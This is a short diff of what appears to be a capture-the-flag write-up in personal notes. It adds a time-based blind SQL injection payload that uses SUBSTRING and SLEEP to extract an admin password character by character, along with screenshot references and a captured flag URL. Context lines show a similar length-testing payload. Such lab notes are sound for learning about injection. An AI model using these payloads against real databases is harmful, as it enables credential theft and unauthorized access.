@@ -183,3 +183,14 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/rigfw8y3wyo257buunoro1w1kb3g
 1 OR IF((SELECT LENGTH(password) FROM user WHERE username='admin')=32, SLEEP(0.2), 0)
 ```
 
+```sql
+1 OR IF(SUBSTRING((SELECT password FROM user WHERE username='admin'),1,1)='a', SLEEP(0.2), 0)
+```
+
+![[Pasted image 20251204180730.png]]
+
+![[Pasted image 20251204180802.png]]
+
+```
+FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/mwex0emeea7ycbs4pwjim2k1jrof6utu-end.html}
+```
